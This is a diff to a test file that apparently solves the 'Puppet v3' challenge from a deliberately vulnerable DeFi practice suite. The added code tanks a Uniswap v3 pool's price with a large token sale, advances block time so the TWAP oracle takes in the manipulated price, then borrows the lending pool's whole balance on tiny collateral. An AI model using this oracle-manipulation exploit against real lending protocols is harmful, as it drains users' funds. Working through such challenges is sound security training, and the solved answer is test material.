@@ -26,7 +26,7 @@ describe('[Challenge] Puppet v3', function () {
     let initialBlockTimestamp;
 
     /** SET RPC URL HERE */
-    const MAINNET_FORKING_URL = "";
+    const MAINNET_FORKING_URL = "https://eth.llamarpc.com";
 
     // Initial liquidity amounts for Uniswap v3 pool
     const UNISWAP_INITIAL_TOKEN_LIQUIDITY = 100n * 10n ** 18n;
@@ -139,7 +139,56 @@ describe('[Challenge] Puppet v3', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        // Create liquidity position with 5 DVT
+        // Sell 105 DVT into Uniswap pool
+        // Move time forward some
+        // Take out loan of 1,000,000 DVT tokens
+        const swapper = await (await ethers.getContractFactory('Swapper', deployer)).deploy(
+          uniswapPool.address,
+          weth.address,
+          token.address,
+          player.address
+        );
+
+        const wethLiquidityAmount = 5n * 10n ** 17n;
+        const dvtLiquidityAmount = 1n;
+        await weth.connect(player).deposit({ value: wethLiquidityAmount });
+        await weth.connect(player).approve(uniswapPositionManager.address, wethLiquidityAmount);
+        await token.connect(player).approve(uniswapPositionManager.address, dvtLiquidityAmount);
+
+        const FEE = 3000; // 0.3%
+
+        await uniswapPositionManager.connect(player).mint({
+          token0: weth.address,
+          token1: token.address,
+          tickLower: -887220,
+          tickUpper: 887220,
+          fee: FEE,
+          recipient: player.address,
+          amount0Desired: wethLiquidityAmount,
+          amount1Desired: dvtLiquidityAmount,
+          amount0Min: 0,
+          amount1Min: 0,
+          deadline: (await ethers.provider.getBlock('latest')).timestamp * 2,
+      }, { gasLimit: 5000000 });   
+
+      // Sell the DVT tokens, tank the price
+      const dvtSellAmount = PLAYER_INITIAL_TOKEN_BALANCE - dvtLiquidityAmount;
+      await token.connect(player).approve(swapper.address, dvtSellAmount);
+      await swapper.connect(player).swap(dvtSellAmount);
+
+      console.log("C slot0", await uniswapPool.slot0());
+
+      await ethers.provider.send("evm_setNextBlockTimestamp", [initialBlockTimestamp + 112]);
+      await ethers.provider.send("evm_mine", []);
+
+      console.log("WETH requried: ", ethers.utils.formatEther(await lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE)));
+      console.log("WETH balance: ", ethers.utils.formatEther(await weth.balanceOf(player.address)));
+
+      const wethCollateralAmount = await lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+      await weth.connect(player).approve(lendingPool.address, wethCollateralAmount);
+
+      await lendingPool.connect(player).borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
     });
 
     after(async function () {
